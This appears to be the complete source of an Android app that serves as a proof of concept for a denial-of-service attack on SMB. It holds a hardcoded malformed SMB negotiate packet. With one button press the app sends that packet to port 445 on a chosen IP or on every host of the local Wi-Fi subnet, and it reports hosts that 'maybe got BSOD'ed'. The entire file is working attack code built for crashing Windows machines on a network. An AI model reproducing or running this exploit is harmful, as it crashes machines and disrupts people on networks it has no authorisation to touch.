package info.lamatricexiste.smbpoc;

import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

import android.app.Activity;
import android.content.Context;
import android.net.DhcpInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;


public class SmbPoc extends Activity
{
    final private int[] buff = {
        0x00,0x00,0x00,0x90,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,
        0x53,0xc8,0x00,0x26,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0xff,0xff,0xff,0xfe,0x00,0x00,0x00,0x00,0x00,0x6d,0x00,0x02,0x50,0x43,
        0x20,0x4e,0x45,0x54,0x57,0x4f,0x52,0x4b,0x20,0x50,0x52,0x4f,0x47,0x52,
        0x41,0x4d,0x20,0x31,0x2e,0x30,0x00,0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,
        0x31,0x2e,0x30,0x00,0x02,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x66,
        0x6f,0x72,0x20,0x57,0x6f,0x72,0x6b,0x67,0x72,0x6f,0x75,0x70,0x73,0x20,
        0x33,0x2e,0x31,0x61,0x00,0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,
        0x32,0x00,0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x32,0x2e,0x31,0x00,0x02,
        0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00,0x02,0x53,0x4d,
        0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00
    };
    final private int port = 445;
    private InetAddress ip_host = null;
    private InetAddress ip_net = null;
    private InetAddress ip_bc = null;
    private WifiManager wifi = null;
    private EditText ipedit = null;
    private TextView textview = null;
    private String output = "";

    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        ipedit = (EditText) findViewById(R.id.ip);
        textview = (TextView) findViewById(R.id.output);
        Button btn = (Button) findViewById(R.id.btn);

        wifi = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);
        if(wifi.isWifiEnabled()) {
            ip_bc = getBroadcastIP();
            ip_net = getNetIP();
        }
       
        btn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                launchAttack();
            }
        });
    }
    
    private void addText(String text){
        output = text + "\n" + output;
        textview.setText(output);
    }
    
    private void launchAttack(){
        String input = ipedit.getText().toString();
        if(input.length()!=0){
            addText("NOT EMPTY ("+input.length()+")");
            try {
                ip_host = InetAddress.getByName(ipedit.getText().toString());
                hackthis();
            } catch (UnknownHostException e) {
                ip_host = null;
                addText(e.getMessage());
            }
        }
        else {
            if(ip_bc!=null && ip_net!=null){
                String ip_bc_str = ip_bc.getHostAddress();
                String ip_net_str = ip_net.getHostAddress();
                
                int dotpos = ip_bc_str.lastIndexOf(".");
                Integer start = Integer.parseInt(ip_net_str.substring(dotpos+1, ip_net_str.length()))+1;
                Integer end = Integer.parseInt(ip_bc_str.substring(dotpos+1, ip_bc_str.length()))-1;

                String ip_start = ip_net_str.substring(0, dotpos);
                for(int i=start; i<end; i++){
                    try {
                        ip_host = InetAddress.getByName(ip_start+"."+i);
                        hackthis();
                    } catch (UnknownHostException e) {
                        addText(e.getMessage());
                    }
                }
            }
        }
    }
    
    private void hackthis(){
        try {
            ip_host.isReachable(500);
            
            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {}
            
            Socket s = new Socket(ip_host, port);
            OutputStream out = s.getOutputStream();
            
            for(int b: buff){
                out.write(b);
            }
            
            out.flush();
            out.close();
            s.close();
            
            addText(ip_host.getHostAddress()+" has SMB and maybe got BSOD'ed");
        }
        catch (java.net.UnknownHostException e){
            addText(ip_host + " " + e.getMessage());
        }
        catch (java.io.IOException e){
            addText(ip_host + " " + e.getMessage());
        }
    }

    private InetAddress getNetIP(){
        DhcpInfo dhcp = wifi.getDhcpInfo();
        int network = (dhcp.ipAddress & dhcp.netmask);
        return getIp(network);
    }

    private InetAddress getBroadcastIP(){
        DhcpInfo dhcp = wifi.getDhcpInfo();
        int broadcast = (dhcp.ipAddress & dhcp.netmask) | ~dhcp.netmask;
        return getIp(broadcast);
    }
    
    private InetAddress getIp(int ip_int){
        byte[] quads = new byte[4];
        
        for (int k = 0; k < 4; k++)
            quads[k] = (byte) ((ip_int >> k * 8) & 0xFF);
        try {
            return InetAddress.getByAddress(quads);
        }
        catch (java.net.UnknownHostException e) {
            addText(e.getMessage());
            return null;
        }
    }
}
